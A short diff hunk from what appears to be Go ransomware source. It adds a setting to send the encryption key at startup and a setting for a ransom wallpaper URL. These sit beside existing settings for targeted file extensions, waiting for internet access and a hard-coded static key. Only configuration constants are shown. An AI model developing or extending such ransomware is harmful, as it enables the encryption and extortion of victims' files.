@@ -10,6 +10,12 @@ const maxFileSize = 1024 * 1024 * 1024 * 1024
 // UseDict The dict is faster if you have ~70 or more extensions
 const UseDict = true
 
+//Sends the key at the start
+const SendKeyAtStart = true
+
+//Sets the wallpaper, leave empty to disable
+const WallpaperUrl = ""
+
 //if this is false it will use the static key below and won't wait for the user to be online
 const WaitForInternet = true
 const StaticKey = "12345678901234567890123456789012"
